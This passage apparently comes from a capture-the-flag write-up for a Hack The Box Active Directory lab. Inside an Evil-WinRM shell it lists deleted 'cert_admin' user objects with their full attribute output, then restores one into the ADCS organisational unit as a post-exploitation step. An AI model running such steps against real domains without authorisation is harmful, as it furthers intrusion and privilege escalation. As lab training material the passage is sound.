```bash
*Evil-WinRM* PS C:\windows\tasks> Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq "user"' -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
CN                              : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
codePage                        : 0
countryCode                     : 0
Created                         : 11/15/2024 7:55:59 PM
createTimeStamp                 : 11/15/2024 7:55:59 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/15/2024 7:57:59 PM
modifyTimeStamp                 : 11/15/2024 7:57:59 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133761921597856970
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 12975
uSNCreated                      : 12844
whenChanged                     : 11/15/2024 7:57:59 PM
whenCreated                     : 11/15/2024 7:55:59 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
CN                              : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:04:05 PM
createTimeStamp                 : 11/16/2024 12:04:05 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:04:21 PM
modifyTimeStamp                 : 11/16/2024 12:04:21 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762502455822446
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13171
uSNCreated                      : 13161
whenChanged                     : 11/16/2024 12:04:21 PM
whenCreated                     : 11/16/2024 12:04:05 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```

Restore AD User:

```bash
*Evil-WinRM* PS C:\windows\tasks> Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb" -TargetPath "OU=ADCS,DC=tombwatcher,DC=htb"
```